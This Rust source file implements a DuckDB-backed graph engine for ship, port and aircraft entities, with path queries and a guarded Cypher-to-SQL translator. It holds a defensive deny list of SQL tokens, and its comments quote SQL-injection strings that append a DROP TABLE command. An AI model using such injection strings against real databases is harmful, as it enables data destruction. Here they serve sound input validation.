//! Graph engine backed by DuckDB — provides the same interface Kuzu would.
//!
//! Maintains dedicated graph tables (node tables + relationship tables) that
//! are periodically synced from the core entity/relationship tables every 30 s.
//! Multi-hop path queries use an in-memory BFS over adjacency data loaded from
//! DuckDB, which is faster and more correct than recursive CTE approaches for
//! paths that need full edge reconstruction.
//!
//! # Architecture
//!
//! ```text
//! entities + entity_properties  ──(sync every 30 s)──►  graph_nodes
//! relationships                 ──(sync every 30 s)──►  graph_edges
//!
//!                      graph_nodes / graph_edges
//!                               │
//!                 ┌─────────────┼──────────────┐
//!           path_query    get_neighbors   cypher_query
//! ```

use crate::traits::{StorageError, StorageResult};
use duckdb::{params, Connection};
use orp_proto::Relationship;
use serde_json::Value as JsonValue;
use std::collections::{HashMap, HashSet, VecDeque};
use std::sync::{Arc, Mutex};
use std::time::Duration;

// ── Schema ─────────────────────────────────────────────────────────────────────

const GRAPH_NODE_TABLE: &str = r#"
CREATE TABLE IF NOT EXISTS graph_nodes (
    node_id      VARCHAR PRIMARY KEY,
    node_type    VARCHAR NOT NULL,
    label        VARCHAR,
    properties   VARCHAR,
    latitude     DOUBLE,
    longitude    DOUBLE,
    confidence   DOUBLE DEFAULT 1.0,
    last_synced  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_gnodes_type ON graph_nodes(node_type);
"#;

const GRAPH_EDGE_TABLE: &str = r#"
CREATE TABLE IF NOT EXISTS graph_edges (
    edge_id      VARCHAR PRIMARY KEY,
    from_node    VARCHAR NOT NULL,
    to_node      VARCHAR NOT NULL,
    from_type    VARCHAR,
    to_type      VARCHAR,
    edge_type    VARCHAR NOT NULL,
    weight       DOUBLE DEFAULT 1.0,
    properties   VARCHAR,
    confidence   DOUBLE DEFAULT 1.0,
    is_active    BOOLEAN DEFAULT TRUE,
    last_synced  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_gedges_from      ON graph_edges(from_node);
CREATE INDEX IF NOT EXISTS idx_gedges_to        ON graph_edges(to_node);
CREATE INDEX IF NOT EXISTS idx_gedges_type      ON graph_edges(edge_type);
CREATE INDEX IF NOT EXISTS idx_gedges_active    ON graph_edges(is_active);
"#;

// Views are created separately, with DROP IF EXISTS first.
const GRAPH_NODE_VIEWS: &[(&str, &str)] = &[
    (
        "ship_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'ship'",
    ),
    (
        "port_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'port'",
    ),
    (
        "aircraft_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'aircraft'",
    ),
    (
        "weather_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'weather'",
    ),
    (
        "organization_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'organization'",
    ),
    (
        "route_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'route'",
    ),
    (
        "sensor_nodes",
        "SELECT * FROM graph_nodes WHERE node_type = 'sensor'",
    ),
];

const GRAPH_EDGE_VIEWS: &[(&str, &str)] = &[
    (
        "docked_at",
        "SELECT * FROM graph_edges WHERE edge_type = 'docked_at'",
    ),
    (
        "heading_to",
        "SELECT * FROM graph_edges WHERE edge_type = 'heading_to'",
    ),
    (
        "owned_by",
        "SELECT * FROM graph_edges WHERE edge_type = 'owned_by'",
    ),
    (
        "managed_by",
        "SELECT * FROM graph_edges WHERE edge_type = 'managed_by'",
    ),
    (
        "insures",
        "SELECT * FROM graph_edges WHERE edge_type = 'insures'",
    ),
    (
        "threatens",
        "SELECT * FROM graph_edges WHERE edge_type = 'threatens'",
    ),
    (
        "near_rel",
        "SELECT * FROM graph_edges WHERE edge_type = 'near'",
    ),
    (
        "follows_route",
        "SELECT * FROM graph_edges WHERE edge_type = 'follows'",
    ),
    (
        "traverse_rel",
        "SELECT * FROM graph_edges WHERE edge_type = 'traverse'",
    ),
    (
        "deployed_on",
        "SELECT * FROM graph_edges WHERE edge_type = 'deployed_on'",
    ),
    (
        "measures_at",
        "SELECT * FROM graph_edges WHERE edge_type = 'measures_at'",
    ),
    (
        "in_region",
        "SELECT * FROM graph_edges WHERE edge_type = 'in_region'",
    ),
];

// ── In-memory edge record ──────────────────────────────────────────────────────

#[derive(Debug, Clone)]
struct EdgeRecord {
    edge_id: String,
    from_node: String,
    to_node: String,
    edge_type: String,
    properties: String,
    confidence: f64,
    is_active: bool,
}

// ── GraphEngine ────────────────────────────────────────────────────────────────

/// High-performance in-process graph engine using DuckDB.
///
/// Maintains a materialised graph layer (graph_nodes + graph_edges) on top of
/// the core entity/relationship tables.  Provides path, neighbour, and
/// Cypher-style queries.
pub struct GraphEngine {
    conn: Arc<Mutex<Connection>>,
}

impl GraphEngine {
    /// Create a new `GraphEngine` sharing the given DuckDB connection.
    pub fn new(conn: Arc<Mutex<Connection>>) -> StorageResult<Self> {
        let engine = Self { conn };
        engine.init_schema()?;
        Ok(engine)
    }

    /// Initialise graph schema tables + views (idempotent).
    fn init_schema(&self) -> StorageResult<()> {
        let conn = self.conn.lock().unwrap();

        conn.execute_batch(GRAPH_NODE_TABLE)
            .map_err(|e| StorageError::DatabaseError(format!("graph node table: {e}")))?;
        conn.execute_batch(GRAPH_EDGE_TABLE)
            .map_err(|e| StorageError::DatabaseError(format!("graph edge table: {e}")))?;

        // Create views with DROP IF EXISTS first to ensure idempotency.
        for (name, select) in GRAPH_NODE_VIEWS.iter().chain(GRAPH_EDGE_VIEWS.iter()) {
            let drop = format!("DROP VIEW IF EXISTS {name}");
            let create = format!("CREATE VIEW {name} AS {select}");
            conn.execute_batch(&drop)
                .map_err(|e| StorageError::DatabaseError(format!("drop view {name}: {e}")))?;
            conn.execute_batch(&create)
                .map_err(|e| StorageError::DatabaseError(format!("create view {name}: {e}")))?;
        }

        Ok(())
    }

    // ── Sync ──────────────────────────────────────────────────────────────────

    /// Rebuild graph tables from the authoritative entity / relationship tables.
    ///
    /// Called every 30 s by the background task.  Uses INSERT OR REPLACE so it
    /// is safe to call repeatedly.
    pub fn sync_from_entities(&self) -> StorageResult<()> {
        let conn = self.conn.lock().unwrap();

        // Sync nodes.
        conn.execute_batch(r#"
            INSERT OR REPLACE INTO graph_nodes
                (node_id, node_type, label, properties, latitude, longitude, confidence, last_synced)
            SELECT
                e.entity_id,
                e.entity_type,
                e.name,
                COALESCE(
                    (SELECT json_group_object(ep.property_key, json(ep.property_value))
                     FROM entity_properties ep
                     WHERE ep.entity_id = e.entity_id AND ep.is_latest = TRUE),
                    '{}'
                ),
                g.latitude,
                g.longitude,
                e.confidence,
                CURRENT_TIMESTAMP
            FROM entities e
            LEFT JOIN entity_geometry g ON g.entity_id = e.entity_id
            WHERE e.is_active = TRUE;
        "#)
        .map_err(|e| StorageError::DatabaseError(format!("graph node sync: {e}")))?;

        // Prune deactivated entities.
        conn.execute_batch(
            r#"
            DELETE FROM graph_nodes
            WHERE node_id NOT IN (
                SELECT entity_id FROM entities WHERE is_active = TRUE
            );
        "#,
        )
        .map_err(|e| StorageError::DatabaseError(format!("graph node prune: {e}")))?;

        // Sync edges (denormalise node types for speed).
        conn.execute_batch(
            r#"
            INSERT OR REPLACE INTO graph_edges
                (edge_id, from_node, to_node, from_type, to_type, edge_type,
                 weight, properties, confidence, is_active, last_synced)
            SELECT
                r.relationship_id,
                r.source_entity_id,
                r.target_entity_id,
                src.node_type,
                tgt.node_type,
                r.relationship_type,
                1.0 / GREATEST(COALESCE(r.confidence, 1.0), 0.001),
                r.properties,
                r.confidence,
                r.is_active,
                CURRENT_TIMESTAMP
            FROM relationships r
            LEFT JOIN graph_nodes src ON src.node_id = r.source_entity_id
            LEFT JOIN graph_nodes tgt ON tgt.node_id = r.target_entity_id;
        "#,
        )
        .map_err(|e| StorageError::DatabaseError(format!("graph edge sync: {e}")))?;

        tracing::debug!("graph sync completed");
        Ok(())
    }

    /// Spawn a Tokio background task that calls `sync_from_entities` every 30 s.
    pub fn start_background_sync(conn: Arc<Mutex<Connection>>) {
        tokio::spawn(async move {
            let engine = match GraphEngine::new(conn) {
                Ok(e) => e,
                Err(err) => {
                    tracing::error!("Failed to init background graph engine: {err}");
                    return;
                }
            };
            let mut interval = tokio::time::interval(Duration::from_secs(30));
            loop {
                interval.tick().await;
                if let Err(err) = engine.sync_from_entities() {
                    tracing::warn!("Graph sync error: {err}");
                }
            }
        });
    }

    // ── Internal: load adjacency list ─────────────────────────────────────────

    /// Load all active edges from DuckDB into an in-memory adjacency list.
    /// Returns `(outgoing_edges, edge_by_id)`.
    #[allow(clippy::type_complexity)]
    fn load_adjacency(
        conn: &Connection,
    ) -> StorageResult<(
        HashMap<String, Vec<EdgeRecord>>,
        HashMap<String, EdgeRecord>,
    )> {
        let mut stmt = conn
            .prepare(
                "SELECT edge_id, from_node, to_node, edge_type, \
                        COALESCE(properties, '{}'), confidence, is_active \
                 FROM graph_edges WHERE is_active = TRUE",
            )
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?;

        let mut rows = stmt
            .query([])
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?;

        let mut out: HashMap<String, Vec<EdgeRecord>> = HashMap::new();
        let mut by_id: HashMap<String, EdgeRecord> = HashMap::new();

        while let Some(row) = rows
            .next()
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?
        {
            let rec = EdgeRecord {
                edge_id: row.get(0).unwrap_or_default(),
                from_node: row.get(1).unwrap_or_default(),
                to_node: row.get(2).unwrap_or_default(),
                edge_type: row.get(3).unwrap_or_default(),
                properties: row.get(4).unwrap_or_default(),
                confidence: row.get(5).unwrap_or(1.0),
                is_active: row.get(6).unwrap_or(true),
            };
            out.entry(rec.from_node.clone())
                .or_default()
                .push(rec.clone());
            by_id.insert(rec.edge_id.clone(), rec);
        }

        Ok((out, by_id))
    }

    fn edge_record_to_rel(rec: &EdgeRecord) -> Relationship {
        let properties: HashMap<String, JsonValue> =
            serde_json::from_str(&rec.properties).unwrap_or_default();
        Relationship {
            relationship_id: rec.edge_id.clone(),
            source_entity_id: rec.from_node.clone(),
            target_entity_id: rec.to_node.clone(),
            relationship_type: rec.edge_type.clone(),
            properties,
            confidence: rec.confidence,
            is_active: rec.is_active,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    // ── Neighbour queries ─────────────────────────────────────────────────────

    /// Return all nodes reachable from `entity_id` within `depth` hops.
    ///
    /// Traverses outgoing edges only.  Returns rows as `HashMap<String, JsonValue>`.
    pub fn get_neighbors(
        &self,
        entity_id: &str,
        depth: usize,
    ) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
        let conn = self.conn.lock().unwrap();
        let (adjacency, _) = Self::load_adjacency(&conn)?;

        // BFS
        let mut visited: HashSet<String> = HashSet::new();
        visited.insert(entity_id.to_string());

        // queue: (node_id, depth_from_start, via_rel_type)
        let mut queue: VecDeque<(String, usize, String)> = VecDeque::new();
        queue.push_back((entity_id.to_string(), 0, String::new()));

        let mut result_nodes: Vec<(String, usize, String)> = Vec::new(); // (node_id, depth, via_rel)

        while let Some((node, d, via)) = queue.pop_front() {
            if d > 0 {
                result_nodes.push((node.clone(), d, via));
            }
            if d >= depth {
                continue;
            }
            if let Some(edges) = adjacency.get(&node) {
                for edge in edges {
                    if !visited.contains(&edge.to_node) {
                        visited.insert(edge.to_node.clone());
                        queue.push_back((edge.to_node.clone(), d + 1, edge.edge_type.clone()));
                    }
                }
            }
        }

        // Fetch node details for found nodes
        if result_nodes.is_empty() {
            return Ok(vec![]);
        }

        let mut results = Vec::new();
        for (nid, d, via_rel) in result_nodes {
            let node_info = self.get_node_info(&conn, &nid)?;
            let mut m: HashMap<String, JsonValue> = node_info;
            m.insert("depth".into(), JsonValue::from(d as i64));
            m.insert("via_rel_type".into(), JsonValue::String(via_rel));
            results.push(m);
        }

        Ok(results)
    }

    fn get_node_info(
        &self,
        conn: &Connection,
        node_id: &str,
    ) -> StorageResult<HashMap<String, JsonValue>> {
        let mut stmt = conn
            .prepare(
                "SELECT node_id, node_type, label, properties, latitude, longitude, confidence \
                 FROM graph_nodes WHERE node_id = ? LIMIT 1",
            )
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?;

        let mut rows = stmt
            .query(params![node_id])
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?;

        if let Some(row) = rows
            .next()
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?
        {
            let mut m = HashMap::new();
            m.insert(
                "node_id".into(),
                JsonValue::String(row.get(0).unwrap_or_default()),
            );
            m.insert(
                "node_type".into(),
                opt_jstr(row.get::<_, Option<String>>(1).ok().flatten()),
            );
            m.insert(
                "label".into(),
                opt_jstr(row.get::<_, Option<String>>(2).ok().flatten()),
            );

            let props_raw: String = row
                .get::<_, Option<String>>(3)
                .ok()
                .flatten()
                .unwrap_or_default();
            let props: JsonValue = serde_json::from_str(&props_raw).unwrap_or(JsonValue::Null);
            m.insert("properties".into(), props);

            if let Ok(Some(lat)) = row.get::<_, Option<f64>>(4) {
                m.insert("latitude".into(), JsonValue::from(lat));
            }
            if let Ok(Some(lon)) = row.get::<_, Option<f64>>(5) {
                m.insert("longitude".into(), JsonValue::from(lon));
            }
            if let Ok(conf) = row.get::<_, f64>(6) {
                m.insert("confidence".into(), JsonValue::from(conf));
            }
            Ok(m)
        } else {
            // Node not found in graph_nodes yet; return minimal info
            let mut m = HashMap::new();
            m.insert("node_id".into(), JsonValue::String(node_id.to_string()));
            Ok(m)
        }
    }

    // ── Path queries ──────────────────────────────────────────────────────────

    /// Find all paths from `source` to `target` up to `max_hops` hops.
    ///
    /// Performs an in-memory BFS over the adjacency list loaded from DuckDB.
    /// Returns each path as a sequence of `Relationship` objects (edges).
    pub fn path_query(
        &self,
        source: &str,
        target: &str,
        max_hops: usize,
    ) -> StorageResult<Vec<Vec<Relationship>>> {
        if max_hops == 0 {
            return Ok(vec![]);
        }

        let conn = self.conn.lock().unwrap();
        let (adjacency, by_id) = Self::load_adjacency(&conn)?;

        // BFS state: (current_node, path_of_edge_ids_so_far, visited_nodes_in_path)
        let mut queue: VecDeque<(String, Vec<String>, HashSet<String>)> = VecDeque::new();
        let mut initial_visited = HashSet::new();
        initial_visited.insert(source.to_string());
        queue.push_back((source.to_string(), vec![], initial_visited));

        let mut found_paths: Vec<Vec<Relationship>> = Vec::new();

        while let Some((node, edge_path, visited)) = queue.pop_front() {
            if edge_path.len() >= max_hops {
                continue;
            }

            if let Some(edges) = adjacency.get(&node) {
                for edge in edges {
                    if visited.contains(&edge.to_node) {
                        continue; // prevent cycles
                    }

                    let mut new_edge_path = edge_path.clone();
                    new_edge_path.push(edge.edge_id.clone());

                    if edge.to_node == target {
                        // Found a path — reconstruct Relationships
                        let rels: Vec<Relationship> = new_edge_path
                            .iter()
                            .filter_map(|eid| by_id.get(eid))
                            .map(Self::edge_record_to_rel)
                            .collect();
                        found_paths.push(rels);
                        // Don't continue from target to avoid spurious longer paths
                    } else {
                        let mut new_visited = visited.clone();
                        new_visited.insert(edge.to_node.clone());
                        queue.push_back((edge.to_node.clone(), new_edge_path, new_visited));
                    }
                }
            }
        }

        Ok(found_paths)
    }

    /// Return the shortest path (fewest hops) between `source` and `target`.
    pub fn shortest_path(
        &self,
        source: &str,
        target: &str,
    ) -> StorageResult<Option<Vec<Relationship>>> {
        let conn = self.conn.lock().unwrap();
        let (adjacency, by_id) = Self::load_adjacency(&conn)?;

        // BFS finds shortest path first naturally.
        let mut queue: VecDeque<(String, Vec<String>, HashSet<String>)> = VecDeque::new();
        let mut initial_visited = HashSet::new();
        initial_visited.insert(source.to_string());
        queue.push_back((source.to_string(), vec![], initial_visited));

        while let Some((node, edge_path, visited)) = queue.pop_front() {
            if let Some(edges) = adjacency.get(&node) {
                for edge in edges {
                    if visited.contains(&edge.to_node) {
                        continue;
                    }

                    let mut new_edge_path = edge_path.clone();
                    new_edge_path.push(edge.edge_id.clone());

                    if edge.to_node == target {
                        let rels: Vec<Relationship> = new_edge_path
                            .iter()
                            .filter_map(|eid| by_id.get(eid))
                            .map(Self::edge_record_to_rel)
                            .collect();
                        return Ok(Some(rels));
                    }

                    let mut new_visited = visited.clone();
                    new_visited.insert(edge.to_node.clone());
                    queue.push_back((edge.to_node.clone(), new_edge_path, new_visited));
                }
            }
        }

        Ok(None)
    }

    // ── Cypher-like query interface ───────────────────────────────────────────

    /// Execute a simplified Cypher-like query and return results as rows.
    ///
    /// Supported patterns (every interpolation is bound via prepared statement
    /// parameters — no user input ever reaches the SQL string):
    /// - `MATCH (n:ship) RETURN n`
    /// - `MATCH (n:ship) WHERE n.name = 'Ever Given' RETURN n`
    /// - `MATCH (n:ship) WHERE n.node_id = 'ship_x' RETURN n`
    /// - `MATCH (a)-[r:docked_at]->(b) RETURN a, r, b`
    /// - `MATCH (a)-[r:docked_at]->(b) WHERE a.node_id = 'ship_x' RETURN a, b`
    /// - `MATCH (a)-[*..3]->(b) WHERE a.node_id = 'ship_x' RETURN b`
    ///
    /// Any input that does not translate into one of the recognised patterns
    /// returns [`StorageError::QueryError`]. Raw SQL passthrough is **not**
    /// supported (security: the previous fallback was an SQL-injection sink).
    /// Result-set size is hard-capped at [`GRAPH_RESULT_HARD_CAP`] regardless
    /// of any user-supplied `LIMIT` clause.
    pub fn cypher_query(&self, query: &str) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
        let q = query.trim();

        // Defensive pre-filter: reject inputs containing tokens that have no
        // place in our cypher subset. The pattern translators below match
        // a *prefix* — they happily accept `MATCH (n:ship); DROP TABLE …` by
        // parsing the `MATCH` and ignoring the rest. Even though the SQL we
        // emit is parameterised (so the injection couldn't actually run),
        // accepting clearly-malicious input is a defence-in-depth fail. So:
        // any `;`, SQL comment marker, or DDL/admin keyword → outright reject.
        //
        // We first strip quoted regions (single + double quotes) so an attacker
        // can't smuggle a forbidden token through a property value, and so
        // legitimate queries with `--` or `;` *inside* quoted property values
        // (e.g. `{id: "alice; --"}`) aren't false-positives.
        let stripped = strip_quoted_regions(q);
        let upper = stripped.to_uppercase();
        const FORBIDDEN_SUBSTRINGS: &[&str] = &[
            ";",
            "--",
            "/*",
            "*/",
            " DROP ",
            " ATTACH ",
            " INSTALL ",
            " LOAD ",
            " COPY ",
            " PRAGMA ",
            " DELETE ",
            " INSERT ",
            " UPDATE ",
            " CREATE ",
            " ALTER ",
            " EXPORT ",
            " IMPORT ",
            " GRANT ",
            " REVOKE ",
        ];
        for token in FORBIDDEN_SUBSTRINGS {
            // Add a leading + trailing space so a match at the start/end of
            // the query (e.g. a bare `DROP TABLE`) still triggers.
            let haystack = format!(" {} ", upper);
            if haystack.contains(token) {
                return Err(StorageError::QueryError(format!(
                    "Unsupported cypher query — forbidden token `{}` is not \
                     allowed; only MATCH/RETURN patterns are supported. \
                     See docs/graph-queries.md.",
                    token.trim()
                )));
            }
        }

        let translated = try_translate_cypher(q).ok_or_else(|| {
            StorageError::QueryError(
                "Unsupported cypher query — only MATCH/RETURN patterns supported. \
                 See docs/graph-queries.md."
                    .to_string(),
            )
        })?;

        self.execute_with_params(&translated.sql, &translated.params)
    }

    /// Execute a SQL query against the graph tables with positional bound
    /// parameters. Used internally by the cypher translation layer; not
    /// exposed publicly because the SQL fragment must come from a trusted
    /// (in-tree) source.
    fn execute_with_params(
        &self,
        sql: &str,
        bind: &[Box<dyn duckdb::types::ToSql>],
    ) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
        let conn = self.conn.lock().unwrap();
        let mut stmt = conn
            .prepare(sql)
            .map_err(|e| StorageError::QueryError(format!("prepare: {e}")))?;

        // Collect bound parameters as `&dyn ToSql` references.
        let bind_refs: Vec<&dyn duckdb::types::ToSql> = bind.iter().map(|b| b.as_ref()).collect();

        // Collect all row data first (positional), then map column names.
        let mut raw_rows: Vec<Vec<JsonValue>> = Vec::new();
        let mut col_count = 0usize;

        {
            let mut rows = stmt
                .query(bind_refs.as_slice())
                .map_err(|e| StorageError::QueryError(format!("query: {e}")))?;

            while let Some(row) = rows
                .next()
                .map_err(|e| StorageError::QueryError(e.to_string()))?
            {
                if col_count == 0 {
                    // Detect column count from the first row by probing.
                    // Try columns until we get an error.
                    let mut c = 0usize;
                    while row.get::<_, String>(c).is_ok()
                        || row.get::<_, f64>(c).is_ok()
                        || row.get::<_, i64>(c).is_ok()
                        || row.get::<_, bool>(c).is_ok()
                    {
                        c += 1;
                        if c > 50 {
                            break;
                        }
                    }
                    col_count = c;
                }
                let mut vals = Vec::with_capacity(col_count);
                for i in 0..col_count {
                    vals.push(row_value(row, i));
                }
                raw_rows.push(vals);
            }
        }

        // After rows are consumed, stmt borrow is released — get column names.
        let col_names: Vec<String> = (0..col_count)
            .map(|i| {
                stmt.column_name(i)
                    .map(|s| s.to_string())
                    .unwrap_or_else(|_| format!("col_{i}"))
            })
            .collect();

        let mut results: Vec<HashMap<String, JsonValue>> = raw_rows
            .into_iter()
            .map(|vals| {
                let mut m = HashMap::new();
                for (i, val) in vals.into_iter().enumerate() {
                    let name = col_names
                        .get(i)
                        .cloned()
                        .unwrap_or_else(|| format!("col_{i}"));
                    m.insert(name, val);
                }
                m
            })
            .collect();

        // Defence-in-depth: even if a translator forgets to emit LIMIT, never
        // hand back more than GRAPH_RESULT_HARD_CAP rows.
        if results.len() > GRAPH_RESULT_HARD_CAP {
            results.truncate(GRAPH_RESULT_HARD_CAP);
        }

        Ok(results)
    }

    /// Execute SQL with no bound parameters. Module-private; used by tests
    /// that exercise the typed views (`ship_nodes`, `docked_at`, etc.) where
    /// the SQL is wholly hard-coded inside the test and contains no user
    /// input. **Never** call this from a code path that touches user input.
    #[cfg(test)]
    fn execute_raw_sql(&self, sql: &str) -> StorageResult<Vec<HashMap<String, JsonValue>>> {
        self.execute_with_params(sql, &[])
    }

    // ── Stats ─────────────────────────────────────────────────────────────────

    /// Return (node_count, edge_count).
    pub fn stats(&self) -> StorageResult<(u64, u64)> {
        let conn = self.conn.lock().unwrap();
        let nodes: i64 = conn
            .query_row("SELECT COUNT(*) FROM graph_nodes", [], |r| r.get(0))
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?;
        let edges: i64 = conn
            .query_row(
                "SELECT COUNT(*) FROM graph_edges WHERE is_active = TRUE",
                [],
                |r| r.get(0),
            )
            .map_err(|e| StorageError::DatabaseError(e.to_string()))?;
        Ok((nodes as u64, edges as u64))
    }
}

// ── Cypher translator ─────────────────────────────────────────────────────────
//
// Every translator below returns a `TranslatedQuery { sql, params }`. The
// `sql` is built from in-tree string literals and trusted identifiers
// (table/column names looked up via allowlists). All values that originate
// from user input are emitted as `?` placeholders and pushed onto `params`,
// so the prepared-statement layer binds them as values — never as SQL.

/// Hard cap on rows returned from any cypher query, regardless of any
/// user-supplied `LIMIT` clause.  Defends against denial-of-service via
/// `LIMIT 999999999`.
pub const GRAPH_RESULT_HARD_CAP: usize = 10_000;

struct TranslatedQuery {
    sql: String,
    params: Vec<Box<dyn duckdb::types::ToSql>>,
}

/// Strip everything inside `'...'` and `"..."` quoted regions, replacing the
/// region with a single space. Used by [`GraphEngine::cypher_query`]'s
/// forbidden-token filter so that property values like `{id: "alice; --"}`
/// don't trip the `;`/`--` rejection rule.
///
/// Naïve about escapes: a literal backslash-quote inside a quoted region
/// is NOT honoured (we treat any matching quote char as the close). Cypher's
/// supported subset here does not use string escapes, so this is safe in
/// practice; if we later accept escape sequences this helper needs an
/// upgrade to track them.
fn strip_quoted_regions(q: &str) -> String {
    let mut out = String::with_capacity(q.len());
    let mut quote: Option<char> = None;
    for ch in q.chars() {
        match quote {
            Some(qc) if ch == qc => {
                quote = None;
                out.push(' ');
            }
            Some(_) => {
                // Inside a quoted region — drop the char.
            }
            None if ch == '\'' || ch == '"' => {
                quote = Some(ch);
                out.push(' ');
            }
            None => out.push(ch),
        }
    }
    out
}

fn try_translate_cypher(q: &str) -> Option<TranslatedQuery> {
    let upper = q.to_uppercase();
    if !upper.contains("MATCH") {
        return None;
    }

    // Pattern 3 (multihop) MUST be checked before pattern 2 (edge match), because
    // a multihop query `MATCH (a)-[*..3]->(b)` does not contain a `:edge_type`,
    // but pattern 2's check below would have accepted the simpler edge form.
    if let Some(t) = translate_multihop_match(q) {
        return Some(t);
    }

    // Pattern 2: MATCH (a)-[r:edge_type]->(b) [WHERE ...] RETURN ...
    if let Some(t) = translate_edge_match(q) {
        return Some(t);
    }

    // Pattern 1: MATCH (n:node_type) [WHERE ...] RETURN n
    if let Some(t) = translate_single_node_match(q) {
        return Some(t);
    }

    None
}

fn translate_single_node_match(q: &str) -> Option<TranslatedQuery> {
    let (alias, node_type) = parse_single_node_match(q)?;
    let table = node_type_to_table(&node_type)?;
    let limit = capped_limit(q);

    let mut params: Vec<Box<dyn duckdb::types::ToSql>> = Vec::new();
    // `?` propagates the outer Option: if WHERE is malformed, return None.
    let where_sql = build_node_where_clause(q, &alias, &mut params)?;

    // SAFETY: `table` is a `&'static str` from the allowlist; `limit` is i64.
    let mut sql = format!(
        "SELECT node_id, node_type, label, properties, latitude, longitude, confidence \
         FROM {table}"
    );
    if let Some(wc) = where_sql {
        sql.push_str(" WHERE ");
        sql.push_str(&wc);
    }
    sql.push_str(" LIMIT ?");
    params.push(Box::new(limit));

    Some(TranslatedQuery { sql, params })
}

fn translate_edge_match(q: &str) -> Option<TranslatedQuery> {
    let upper = q.to_uppercase();
    // Must have ]->(  pattern
    if !upper.contains("]->(") && !upper.contains("]->") {
        return None;
    }
    // Extract edge type between : and ]
    let edge_type = extract_between(q, ":", "]")?;
    let edge_type = edge_type.trim().to_lowercase();
    if edge_type.is_empty() {
        return None;
    }
    // Allowlist: edge_type must match a configured edge view name. This stops
    // SQL injection through `[r:foo'; DROP TABLE x --]` and unknown types.
    if !is_allowlisted_edge_type(&edge_type) {
        return None;
    }

    let limit = capped_limit(q);
    let mut params: Vec<Box<dyn duckdb::types::ToSql>> = Vec::new();
    // First param: edge_type (bound, not interpolated)
    params.push(Box::new(edge_type));

    // `?` propagates: if WHERE is malformed, return None.
    let extra_where = build_edge_where_clause(q, &mut params)?;

    let mut sql = String::from(
        "SELECT src.node_id AS from_id, src.node_type AS from_type, src.label AS from_label, \
                e.edge_type, e.properties AS edge_props, e.confidence AS edge_confidence, \
                tgt.node_id AS to_id, tgt.node_type AS to_type, tgt.label AS to_label \
         FROM graph_edges e \
         JOIN graph_nodes src ON src.node_id = e.from_node \
         JOIN graph_nodes tgt ON tgt.node_id = e.to_node \
         WHERE e.edge_type = ? AND e.is_active = TRUE",
    );
    if let Some(wc) = extra_where {
        sql.push_str(" AND ");
        sql.push_str(&wc);
    }
    sql.push_str(" LIMIT ?");
    params.push(Box::new(limit));

    Some(TranslatedQuery { sql, params })
}

fn translate_multihop_match(q: &str) -> Option<TranslatedQuery> {
    let upper = q.to_uppercase();
    if !upper.contains("[*") {
        return None;
    }
    let hops_str = extract_between(q, "..", "]").unwrap_or_else(|| "3".into());
    let raw_hops: i64 = hops_str.trim().parse().unwrap_or(3);
    // Clamp hops to a sane range [1, 10] to bound recursion.
    let max_hops: i64 = raw_hops.clamp(1, 10);
    let src_id = extract_id_from_where(q, "a")?;
    // Multihop has its own hard limit (500) which is already below
    // GRAPH_RESULT_HARD_CAP, so we keep it but still apply the cap to be
    // defence-in-depth against future edits.
    let limit = capped_limit_with_default(q, 500);

    let sql = String::from(
        "WITH RECURSIVE multi_hop AS (\n    \
            SELECT e.from_node, e.to_node, e.edge_type, e.edge_id, 1 AS hop, \
                   [e.edge_id] AS visited \
            FROM graph_edges e \
            WHERE e.from_node = ? AND e.is_active = TRUE\n    \
            UNION ALL\n    \
            SELECT e2.from_node, e2.to_node, e2.edge_type, e2.edge_id, mh.hop + 1, \
                   list_append(mh.visited, e2.edge_id) \
            FROM graph_edges e2 \
            JOIN multi_hop mh ON e2.from_node = mh.to_node \
            WHERE e2.is_active = TRUE AND mh.hop < ? \
              AND NOT list_contains(mh.visited, e2.edge_id)\n\
        )\n\
        SELECT DISTINCT n.node_id, n.node_type, n.label, n.properties, \
               n.latitude, n.longitude, mh.hop AS depth \
        FROM multi_hop mh \
        JOIN graph_nodes n ON n.node_id = mh.to_node \
        ORDER BY mh.hop LIMIT ?",
    );

    let params: Vec<Box<dyn duckdb::types::ToSql>> =
        vec![Box::new(src_id), Box::new(max_hops), Box::new(limit)];

    Some(TranslatedQuery { sql, params })
}

// ── Allowlists ────────────────────────────────────────────────────────────────

/// Map a cypher `node_type` (`ship`, `port`, ...) to the corresponding view
/// name. Returns `None` if the type isn't allowlisted, which causes the
/// translator to bail and `cypher_query` to return an error rather than
/// fall through.  The view-name returned here is a `&'static str` from the
/// in-tree allowlist, so it is safe to interpolate into SQL.
fn node_type_to_table(node_type: &str) -> Option<&'static str> {
    match node_type.to_lowercase().as_str() {
        "ship" => Some("ship_nodes"),
        "port" => Some("port_nodes"),
        "aircraft" => Some("aircraft_nodes"),
        "weather" | "weather_system" => Some("weather_nodes"),
        "organization" | "org" => Some("organization_nodes"),
        "route" => Some("route_nodes"),
        "sensor" => Some("sensor_nodes"),
        _ => None,
    }
}

/// Returns true iff the supplied edge type is one of the configured edge
/// views. This is the key defence against `MATCH (a)-[r:'; DROP --]->(b)`.
fn is_allowlisted_edge_type(edge_type: &str) -> bool {
    // The cypher `edge_type` maps onto `graph_edges.edge_type` values.
    // These match the second component of GRAPH_EDGE_VIEWS' SELECT clauses.
    matches!(
        edge_type,
        "docked_at"
            | "heading_to"
            | "owned_by"
            | "managed_by"
            | "insures"
            | "threatens"
            | "near"
            | "follows"
            | "traverse"
            | "deployed_on"
            | "measures_at"
            | "in_region"
    )
}

// ── WHERE-clause builders ─────────────────────────────────────────────────────

